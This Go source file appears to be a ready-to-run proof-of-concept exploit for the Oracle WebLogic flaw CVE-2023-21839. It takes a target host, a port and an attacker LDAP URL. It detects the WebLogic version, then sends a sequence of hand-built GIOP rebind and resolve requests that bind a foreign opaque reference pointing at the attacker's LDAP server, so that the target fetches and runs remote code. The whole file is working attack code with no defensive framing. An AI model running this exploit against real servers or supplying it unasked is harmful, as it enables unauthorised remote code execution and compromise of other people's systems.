package main

import (
	"CVE-2023-21839"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"net"
	"strings"
)

var (
	hostConfig string
	portConfig int
	ldapConfig string
)

var (
	key1    string
	key2    string
	key3    string
	wlsKey1 string
	wlsKey2 string
)

var (
	ServiceContext0 = &giop.ServiceContext{
		VSCID:      giop.D("000000"),
		SCID:       giop.D("05"),
		Endianness: []byte{giop.BigEndianType},
		Data:       giop.D("000000000000010000000d3137322e32362e3131322e310000ec5b"),
	}
	ServiceContext1 = &giop.ServiceContext{
		VSCID:      giop.D("000000"),
		SCID:       giop.D("01"),
		Endianness: []byte{giop.BigEndianType},
		Data:       giop.D("0000000001002005010001"),
	}
	ServiceContext2 = &giop.ServiceContext{
		VSCID:      giop.D("424541"),
		SCID:       giop.D("00"),
		Endianness: []byte{giop.BigEndianType},
		Data:       giop.D("0a0301"),
	}
)

func main() {
	flag.StringVar(&hostConfig, "ip", "", "ip")
	flag.IntVar(&portConfig, "port", 7001, "port")
	flag.StringVar(&ldapConfig, "ldap", "", "ldap")
	flag.Parse()

	if hostConfig == "" || ldapConfig == "" {
		fmt.Println("Weblogic CVE-2023-21839")
		flag.Usage()
		return
	}

	if !strings.HasPrefix(ldapConfig, "ldap") {
		fmt.Println("Weblogic CVE-2023-21839")
		flag.Usage()
	}

	fmt.Printf("[*] your-ip: %s\n", hostConfig)
	fmt.Printf("[*] your-port: %d\n", portConfig)
	fmt.Printf("[*] your-ldap: %s\n", ldapConfig)

	vp := "743320392e322e302e300a41533a3235350a484c3a39320a4d5" +
		"33a31303030303030300a50553a74333a2f2f746573743a373030310a0a"
	ver := giop.GetVersion(hostConfig, vp, portConfig)
	if ver == "12" {
		fmt.Println("[*] weblogic 12")
		wlsKey1 = "00424541080103000000000c41646d696e53657276657200000000000000003349" +
			"444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743" +
			"6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000" +
			"00000000000000{{key1}}"
		wlsKey2 = "00424541080103000000000c41646d696e53657276657200000000000000003349" +
			"444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743" +
			"6f6e74657874416e793a312e30000000000004{{key3}}000000014245412c0000001000" +
			"00000000000000{{key1}}"
	} else if ver == "14" {
		fmt.Println("[*] weblogic 14")
		wlsKey1 = "00424541080103000000000c41646" +
			"d696e53657276657200000000000000003349444c3a7765626c" +
			"6f6769632f636f7262612f636f732f6e616d696e672f4e616d6" +
			"96e67436f6e74657874416e793a312e30000000000002380000" +
			"00000000014245412e000000100000000000000000{{key1}}"
		wlsKey2 = "00424541080103000000000c41646d696e53657276657" +
			"200000000000000003349444c3a7765626c6f6769632f636f72" +
			"62612f636f732f6e616d696e672f4e616d696e67436f6e74657" +
			"874416e793a312e30000000000004{{key3}}00000001424541" +
			"2e000000100000000000000000{{key1}}"
	} else {
		fmt.Println("[!] error and exit")
	}

	host := hostConfig
	port := portConfig
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	rmi := ldapConfig
	// [ldap len] [ldap string]
	ldap := hex.EncodeToString([]byte{byte(len(rmi))})
	ldap += hex.EncodeToString([]byte(rmi))
	if err != nil {
		return
	}

	locateRequest := &giop.LocateRequest{
		Header: &giop.Header{
			Magic:        giop.D(giop.GIOP),
			MajorVersion: []byte{giop.MajorVersion},
			MinorVersion: []byte{giop.MinorVersion},
			MessageFlags: []byte{giop.BigEndianType},
			MessageType:  []byte{giop.LocateRequestType},
		},
		RequestId:     giop.Int32(2),
		TargetAddress: giop.D(giop.KeyAddr),
		KeyAddress:    giop.D(giop.NameService),
	}

	giop.Log(2, "LocateRequest")
	_, _ = conn.Write(locateRequest.Bytes())
	buf := make([]byte, 1024*10)
	_, _ = conn.Read(buf)

	temp1 := make([]byte, 8)
	temp2 := make([]byte, 8)

	// GIOP Header
	// IOR Prefix
	iOff := 0x60
	for buf[iOff] != 0x00 {
		// ProfileHost
		iOff++
	}
	if iOff > 1024*10 {
		return
	}
	for buf[iOff] == 0x00 {
		iOff++
	}
	p := make([]byte, 2)
	p[0] = buf[iOff]
	iOff++
	p[1] = buf[iOff]

	tempPort := int(binary.BigEndian.Uint16(p))

	if tempPort != port {
		return
	}

	lt := iOff - 0x60
	fOff := 0x60 + lt + 0x75
	// other cases
	for buf[fOff] == 0x00 {
		fOff++
	}

	// Fake ObjectKey1
	copy(temp1[0:8], buf[fOff:fOff+8])
	copy(temp2[4:8], buf[fOff+4:fOff+8])
	// Fake ObjectKey2
	copy(temp2[0:4], []byte{0xff, 0xff, 0xff, 0xff})
	key1 = giop.E(temp1)
	key2 = giop.E(temp2)

	wlsKey1 = strings.ReplaceAll(wlsKey1, "{{key1}}", key1)

	rebindAny := &giop.RebindRequest{
		Header: &giop.Header{
			Magic:        giop.D(giop.GIOP),
			MajorVersion: []byte{giop.MajorVersion},
			MinorVersion: []byte{giop.MinorVersion},
			MessageFlags: []byte{giop.BigEndianType},
			MessageType:  []byte{giop.RequestType},
		},
		RequestId:        giop.Int32(3),
		ResponseFlags:    []byte{giop.WithTargetScope},
		TargetAddress:    giop.D(giop.KeyAddr),
		KeyAddress:       giop.D(wlsKey1),
		RequestOperation: giop.D(giop.RebindAnyOp),
		ServiceContextList: &giop.ServiceContextList{
			SequenceLength: giop.Int32(6),
			ServiceContext: []*giop.ServiceContext{
				ServiceContext0,
				ServiceContext1,
				{
					VSCID:      giop.D("000000"),
					SCID:       giop.D("06"),
					Endianness: []byte{giop.BigEndianType},
					Data: giop.D("0000000000002849444c3a6f6d672e6f72672f53656e64696e67436" +
						"f6e746578742f436f6465426173653a312e30000000000100000000000000b8000102000000000" +
						"d3137322e32362e3131322e310000ec5b000000640042454108010300000000010000000000000" +
						"0000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f646542617" +
						"3653a312e30000000000331320000000000014245412a0000001000000000000000005eedafdeb" +
						"c0d227000000001000000010000002c00000000000100200000000300010020000100010501000" +
						"10001010000000003000101000001010905010001"),
				},
				{
					VSCID:      giop.D("000000"),
					SCID:       giop.D("0f"),
					Endianness: []byte{giop.BigEndianType},
					Data:       giop.D("00000000000000000000000000000100000000000000000100000000000000"),
				},
				{
					VSCID:      giop.D("424541"),
					SCID:       giop.D("03"),
					Endianness: []byte{giop.BigEndianType},
					Data:       giop.D("00000000000000" + key2 + "00000000"),
				},
				ServiceContext2,
			},
		},
		StubData: giop.D("0000000000000001000000047465737400000001000000000000001d0000001c00000000000000010" +
			"0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69" +
			"6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384" +
			"13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242" +
			"412f57537472696e6756616c75653a312e300000000000" + ldap),
	}

	giop.Log(3, "RebindRequest")
	_, _ = conn.Write(rebindAny.Bytes())
	buf = make([]byte, 1024*10)
	_, _ = conn.Read(buf)

	startOff := 0x64 + lt + 0xc0 + len(host) + // SendingContextRuntime
		0xac + lt + // IOR ProfileHost ProfilePort
		0x5d // ObjectKey Prefix
	for buf[startOff] != 0x32 {
		if startOff > 0x2710 {
			break
		}
		// InternalKey Offset
		startOff++
	}

	if startOff > 0x2710 {
		key3 = giop.E([]byte{0x32, 0x38, 0x39, 0x00})
	} else {
		key3 = giop.E(buf[startOff : startOff+4])
	}

	wlsKey2 = strings.ReplaceAll(wlsKey2, "{{key3}}", key3)
	wlsKey2 = strings.ReplaceAll(wlsKey2, "{{key1}}", key1)

	rebindAnyTwice := &giop.RebindRequest{
		Header: &giop.Header{
			Magic:        giop.D(giop.GIOP),
			MajorVersion: []byte{giop.MajorVersion},
			MinorVersion: []byte{giop.MinorVersion},
			MessageFlags: []byte{giop.BigEndianType},
			MessageType:  []byte{giop.RequestType},
		},
		RequestId:        giop.Int32(4),
		ResponseFlags:    []byte{giop.WithTargetScope},
		TargetAddress:    giop.D(giop.KeyAddr),
		KeyAddress:       giop.D(wlsKey2),
		RequestOperation: giop.D(giop.RebindAnyOp),
		ServiceContextList: &giop.ServiceContextList{
			SequenceLength: giop.Int32(4),
			ServiceContext: []*giop.ServiceContext{
				ServiceContext0,
				ServiceContext1,
				{
					VSCID:      giop.D("424541"),
					SCID:       giop.D("03"),
					Endianness: []byte{giop.BigEndianType},
					Data:       giop.D("00000000000000" + key2 + "00000000"),
				},
				ServiceContext2,
			},
		},
		StubData: giop.D("00000001000000047465737400000001000000000000001d0000001c00000000000000010" +
			"0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69" +
			"6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384" +
			"13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242" +
			"412f57537472696e6756616c75653a312e300000000000" + ldap),
	}

	giop.Log(4, "RebindRequest")
	_, _ = conn.Write(rebindAnyTwice.Bytes())
	buf = make([]byte, 1024*10)
	_, _ = conn.Read(buf)

	locateRequest2 := &giop.LocateRequest{
		Header: &giop.Header{
			Magic:        giop.D(giop.GIOP),
			MajorVersion: []byte{giop.MajorVersion},
			MinorVersion: []byte{giop.MinorVersion},
			MessageFlags: []byte{giop.BigEndianType},
			MessageType:  []byte{giop.LocateRequestType},
		},
		RequestId:     giop.Int32(5),
		TargetAddress: giop.D(giop.KeyAddr),
		KeyAddress:    giop.D(giop.NameService),
	}

	giop.Log(5, "LocateRequest")
	_, _ = conn.Write(locateRequest2.Bytes())
	buf = make([]byte, 1024*10)
	_, _ = conn.Read(buf)

	resolve := &giop.ResolveRequest{
		Header: &giop.Header{
			Magic:        giop.D(giop.GIOP),
			MajorVersion: []byte{giop.MajorVersion},
			MinorVersion: []byte{giop.MinorVersion},
			MessageFlags: []byte{giop.BigEndianType},
			MessageType:  []byte{giop.RequestType},
		},
		RequestId:        giop.Int32(6),
		ResponseFlags:    []byte{giop.WithTargetScope},
		TargetAddress:    giop.D(giop.KeyAddr),
		KeyAddress:       giop.D(wlsKey1),
		RequestOperation: giop.D(giop.ResolveOp),
		ServiceContextList: &giop.ServiceContextList{
			SequenceLength: giop.Int32(4),
			ServiceContext: []*giop.ServiceContext{
				ServiceContext0,
				ServiceContext1,
				{
					VSCID:      giop.D("424541"),
					SCID:       giop.D("03"),
					Endianness: []byte{giop.BigEndianType},
					Data:       giop.D("00000000000000" + key2 + "00000000"),
				},
				ServiceContext2,
			},
		},
		CosNamingDissector: giop.D("00000000000000010000000574657374000000000000000100"),
	}
	giop.Log(6, "ResolveRequest")
	_, _ = conn.Write(resolve.Bytes())
	buf = make([]byte, 1024*10)
	_, _ = conn.Read(buf)

	resolveTwice := &giop.ResolveRequest{
		Header: &giop.Header{
			Magic:        giop.D(giop.GIOP),
			MajorVersion: []byte{giop.MajorVersion},
			MinorVersion: []byte{giop.MinorVersion},
			MessageFlags: []byte{giop.BigEndianType},
			MessageType:  []byte{giop.RequestType},
		},
		RequestId:        giop.Int32(7),
		ResponseFlags:    []byte{giop.WithTargetScope},
		TargetAddress:    giop.D(giop.KeyAddr),
		KeyAddress:       giop.D(wlsKey2),
		RequestOperation: giop.D(giop.ResolveOp),
		ServiceContextList: &giop.ServiceContextList{
			SequenceLength: giop.Int32(4),
			ServiceContext: []*giop.ServiceContext{
				ServiceContext0,
				ServiceContext1,
				{
					VSCID:      giop.D("424541"),
					SCID:       giop.D("03"),
					Endianness: []byte{giop.BigEndianType},
					Data:       giop.D("00000000000000" + key2 + "00000000"),
				},
				ServiceContext2,
			},
		},
		CosNamingDissector: giop.D("00000000000000010000000574657374000000000000000100"),
	}
	giop.Log(7, "ResolveRequest")
	_, _ = conn.Write(resolveTwice.Bytes())
	buf = make([]byte, 1024*10)
	_, _ = conn.Read(buf)

	err = conn.Close()
	if err != nil {
		fmt.Println(err)
	}
}
